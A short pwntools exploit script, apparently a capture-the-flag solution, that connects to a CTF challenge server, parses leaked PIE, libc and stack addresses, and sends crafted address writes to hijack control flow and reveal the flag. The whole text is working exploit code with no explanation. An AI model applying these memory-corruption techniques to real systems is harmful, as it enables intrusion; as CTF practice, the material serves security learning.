from pwn import *

e = context.binary = ELF("./chall2",checksec=False)

#r = e.process(stdin=PTY)

libc = ELF("./libc.so.6",checksec=False)
r = remote("wfw2.2023.ctfcompetition.com", 1337)
r.recvuntil(b'fluff\n')

pie_base = int(r.recv(12), 16)

log.info(f'PIE: {hex(e.address)}')
#print(hex(e.address + 0x2050))
print("Flag address: " + hex(e.sym['flag']))
for i in range(7):
    r.recvline()
libc.address = int(r.recv(12).decode(), 16)
log.info(f'Libc: {hex(libc.address)}')

for i in range(12):
    r.recvline()
stack = int(r.recv(12), 16)
log.info(f"Stack: {hex(stack)}")


target = pie_base + 0x0020d5  
buf = hex(target).encode() + b' ' + b'50'
r.sendline(buf)

flag = pie_base + 0x00000000000050A0 - 3
buf = hex(flag).encode() + b' ' + b'3'
r.sendline(buf)

exit_got = pie_base + 0x01441

buf = hex(exit_got).encode() + b' '+ b'1'
r.sendline(buf)
r.interactive()

